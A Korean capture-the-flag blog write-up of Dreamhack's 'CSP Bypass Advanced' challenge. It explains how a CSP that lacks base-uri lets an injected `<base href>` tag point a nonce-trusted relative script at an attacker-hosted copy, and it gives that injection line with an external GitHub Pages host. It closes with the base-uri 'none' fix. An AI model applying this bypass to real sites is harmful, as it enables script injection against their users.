---
layout: single
title: 'Dreamhack CSP Bypass Advanced를 통해 공부하는 콘텐츠 보안 정책'
sidebar:
    nav: "main"
tag : [dreamhack, web, 웹 해킹, exploit, xss, csp, src, base]
categories: [wargame, 보안]
toc : true
toc_sticky: true
toc_label: "Contents"
author_profile: true
search: true
comments: true
published: true
---

<div class="notice--success">  
본 포스팅은 드림핵의 가이드라인을 준수하여 작성되었습니다. 전체 익스플로잇 스크립트나 FLAG 값은 포함하지 않으며, 취약점의 원리 분석과 방어 대책에 집중합니다.
</div>

안녕하세요! 오늘은 드림핵(Dreamhack)의 **CSP Bypass Advanced** 워게임 문제를 풀어보며 콘텐츠 보안 정책에 대해 더 깊이있게 공부해보려고 합니다.<br>


문제를 풀기 전, 제가 스스로 취약점을 분석하고 공격 로직을 세우기 위해 디딤돌로 삼았던 드림핵 공식 학습 링크와 챌린지 주소를 아래에 공유합니다.<br>

##  주요 관련 링크 바로가기

| 구분 | 링크 안내 |
| :--- | :--- |
| **워게임 도전** | [ 드림핵 공식 CSP Bypass Advanced 워게임 챌린지 링크](https://dreamhack.io/wargame/challenges/436) |
| **관련 강의** | [ 드림핵 공식 CSP 강의 링크](https://learn.dreamhack.io/321) |

이 문제의 핵심은 CSP의 인라인 코드 보안 정책을 뚫고 스크립트를 실행하는 것입니다.<br>

## 1. 코드 분석

@app.after_request
```python
@app.after_request
def add_header(response):
    global nonce
    response.headers['Content-Security-Policy'] = f"default-src 'self'; img-src https://dreamhack.io; style-src 'self' 'unsafe-inline'; script-src 'self' 'nonce-{nonce}'; object-src 'none'"
    nonce = os.urandom(16).hex()
    return response
```
add_header()함수는 콘텐츠 보안 정책을 설정하는 함수로 다음과 같습니다.
<div class="notice--info"> 
"default-src 'self' : -src 속성으로 끝나는 모든 지시문은 같은 출처 내에서 로드하는 리소스만 허용합니다.<br>
img-src https://dreamhack.io : 이미지 로드는 https://dreamhack.io 에서만 허용합니다.<br>
style-src 'self' 'unsafe-inline' : 스타일시트 또한 같은 출처 내에서 로드하는 리소스만 허용하면서 예외적으로 인라인 코드를 허용합니다.<br>
script-src 'self' 'nonce-{nonce}' : 스크립트 시트 또한 같은 출처 내에서 로드하는 리소스만 허용하면서 예외적으로 nonce속성을 설정하여 인라인 코드를 허용합니다.<br>
object-src 'none' : 모든 출처를 허용하지 않습니다.<br>
여기서 한 가지 주의깊게 볼 점은 base-uri 지시문이 미 설정 되어있다는 것입니다.<br>
<div>

@app.route("/vuln")
```python
@app.route("/vuln")
def vuln():
    param = request.args.get("param", "")
    return render_template("vuln.html", param=param, nonce=nonce)

```
CSP Bypass 문제와 다른 점이 여기서 발생합니다.<br>
<font color='#ffbf00'> vuln 메서드에서 값을 리턴할 때 render_template을 활용하였기 때문에 전달된 변수를 HTML 엔티티로 변환해 저장하기 때문에 스크립트 삽입이 어려워졌습니다.</font>

```html
<div class="container>
    ::before
    <img src="https://dreamhack.io/assets/img/logo.0a8aabe.svg">
    ::after
</div>
<!--/container --> == $0
<!--Bootstrap coe JavaScript -->
<script src="/static/js/jquery.min.js" nonce></script>
<script src="/static/js/bootstrap.min.js" nonce></script>
```
저 뿐만 아니라 이 문제를 풀어보신 모든 분들은 이 부분이 핵심이라고 생각 하실 것 같습니다.
문제의 `/vuln` 페이지에 접속해 개발자 도구를 확인해 보면 위와 같은 html 코드를 확인 할 수 있습니다.

(1) `class="container>` : container 값에 텍스트를 입력시 그에 맞는 텍스트가 나오는 것을 알 수 있습니다.

(2) `<script src="/static/js/jquery.min.js" nonce></script>` : 파일의 경로가 상대경로로 구성되어 있으며 `nonce` 값도 가지고 있어 스크립트가 실행되어 min.js 값을 가지고 오는 것을 알 수 있습니다.

## 2. 가설 설정

1. base-uri 지시문을 설정하지 않았기 때문에 <font color='#4ADE80'>base태그를 활용해 스크립트를 실행하는 페이지로 경로가 해석되는 기준점을 변경할 수 있으니 base 태그를 사용하는 방향으로 페이로드를 구상했습니다.</font><br>

2. 또한 base 태그를 활용하여 경로의 기준점을 바꾸기 위해서는 <font color='#4ADE80'>경로가 상대 경로여야 스크립트 삽입이 가능</font>해집니다.
`<script src="/static/js/jquery.min.js" nonce></script>`

3. 추가로 base 태그로 변경된 기준 주소를 따라갈 때 가져올 자바스크립트 파일을 서버(Github)에 똑같은 경로 구조로 만들어야 합니다.

   [+] 경로 만드는 법
   내 외부 주소https://외부주소/와 같이 github의 repository 를 활용하여 만들어 줍니다.<br>
   이때 이름은 **static** 이어야 합니다!!<br>
   경로가 같아야 경로를 타고 파일을 실행하기 때문입니다!<br>

   생성할 파일 경로:/static/js/jquery.min.js <br>

   static 안에 /js/jquery.min.js 파일을 만들어주고 스크립트를 넣어주면 끝!


## 3. 페이로드 작성

### (1. base 태그 활용)
{: .no_toc}

`/vuln` 페이지의 HTML 코드를 보면 아래와 같이 상대 경로로 스크립트를 불러오는 구문이 존재합니다.<br>
`<script src="/static/js/jquery.min.js" nonce></script>`

만약 `<base>` 태그를 주입하여 상대 경로의 기준점(Base URL)을 공격자의 서버로 변경할 수 있다면, 브라우저는 공격자 서버에서 악성 스크립트를 다운로드하여 실행하게 됩니다.<br>

이를 위해 HTML 태그를 주입할 수 있는 지점을 찾았고, `/vuln` 페이지의 `param` 파라미터를 통해 입력한 HTML 코드(예: `<base>` 태그)가 필터링 없이 그대로 출력되는 것을 확인하였습니다.<br>

따라서 flag 페이지의 봇이 접속할 URL로 `<base>` 태그가 주입된 `/vuln` 페이지 주소를 전달함으로써 공격을 수행할 수 있었습니다.<br>
`<base href="외부주소">`

### (2. 외부 서버 설정)
{: .no_toc}

vuln 페이지의 HTML 코드를 보면 <script src="/static/js/jquery.min.js" nonce></script> 이와 같이 작성되어 있습니다.<br>

nonce 속성을 가지고 있고 같은 출처이기에 스크립트를 실행 할 수 있는데 /static/js/jquery.min.js경로의 파일을 실행을 합니다.<br>
즉, 다시 말해서 <font color='#4ADE80'>외부 서버 주소에는 /static/js/jquery.min.js 경로가 똑같이 존재해야 jquery.min.js 파일을 실행 시킬 수 있습니다.</font><br>

### (3. jquery.min.js 파일 스크립트 작성)
{: .no_toc}

스크립트 작성 시 기억해야 할 점은 현재 <base> 태그를 활용하여 기준 경로를 외부 공격자인 저의 경로로 바꾸었지만 <font color='#4ADE80'>최상위 경로는 드림핵 문제 서버인 로컬 주소</font>임을 기억해야 합니다.<br>

즉, <font color='#4ADE80'>로컬주소</font>를 작성해야 memo페이지에서 플래그를 확인 할 수 있습니다.<br>

## 4. 시큐어 코딩

###  base - uri 설정
{: .no_toc}

본 문제에서 발생한 핵심 취약점은 Content Security Policy(CSP) 내에 `base-uri` 지시문이 생략되어 있다는 점이었습니다. 

서버의 `app.py` 내 `add_header` 함수를 아래와 같이 수정하여 `base-uri 'none'` 정책을 추가하였습니다.

```python
@app.after_request
def add_header(response):
    global nonce
    response.headers['Content-Security-Policy'] = f"default-src 'self'; img-src https://dreamhack.io; style-src 'self' 'unsafe-inline'; script-src 'self' 'nonce-{nonce}'; object-src 'none' ; base-uri 'none' ;"
    nonce = os.urandom(16).hex()
    return response
```

<div style="text-align: center; margin: 20px 0;">
  <img src="{{ '/images/CPSBypassAdvanced/security.png' | relative_url }}" 
       alt="보안 설정 추가" 
       style="max-width: 80%; height: auto; border: 1px solid #ddd; border-radius: 5px;">
  <p style="font-size: 0.9em; color: #666;">[보안 설정 추가]</p>
</div>

base-uri 'none' 설정을 통해 공격자가 `<base>` 태그를 주입하더라도 브라우저 레벨에서 기준 경로 변경을 거부하도록 처리하였습니다.
결과적으로 상대 경로로 호출되는 jquery.min.js 등 핵심 스크립트가 외부 악성 서버로 우회 요청되는 공격 벡터를 원천 차단할 수 있습니다.

## 마치며

처음 이 문제에 접근할 때는 `base-uri` 설정이 없으니 단지 `<base>` 태그를 써야겠다는 생각만으로, 무작정 `param`에 `<base href="https://surilog.github.io/exploit">` 같은 값만 주입해 보았습니다.<br>

당연히 드림핵 코드스페이스의 exploit 파일에 동작하지도 않는 스크립트를 적어두고 한참을 헤맸습니다...<br>

아무리 고민해도 스크립트가 실행되지 않아 Q&A 게시판을 확인했고, 그제야 **`/vuln` 페이지의 실제 HTML 구조부터 확인해야 한다**는 가장 기본적인 단계를 놓치고 있었다는 점을 깨달았습니다.<br>

페이지 소스에서 `<script src="/static/js/jquery.min.js" nonce></script>`와 같이 상대 경로로 지정된 스크립트를 확인한 후, GitHub에 `static`이라는 이름의 레포지토리를 만들고 그 안에 `/js/jquery.min.js` 경로를 똑같이 구성하여 스크립트를 올려두었습니다.<br>

이 과정에서 `<base>` 태그는 문서 전체의 **기준 URL(Base URL)**을 바꾸는 역할이라는 점을 다시 한번 명확히 이해할 수 있었습니다.<br> 
`<base href="https://surilog.github.io/">`가 주입되면, 브라우저는 기존의 `/static/js/jquery.min.js`를 공격자 서버의 `https://surilog.github.io/static/js/jquery.min.js` 경로로 요청하게 되고, `nonce` 검증까지 우회하며 코드가 실행되는 것이었습니다.<br>

원리를 깨닫고 성공하기까지 많은 시행착오가 있었지만, 직접 가설을 세우고 디버깅해 보면서 웹 보안과 브라우저 파싱 동작에 대해 훨씬 깊이 있게 배울 수 있었던 즐거운 시간이었습니다.
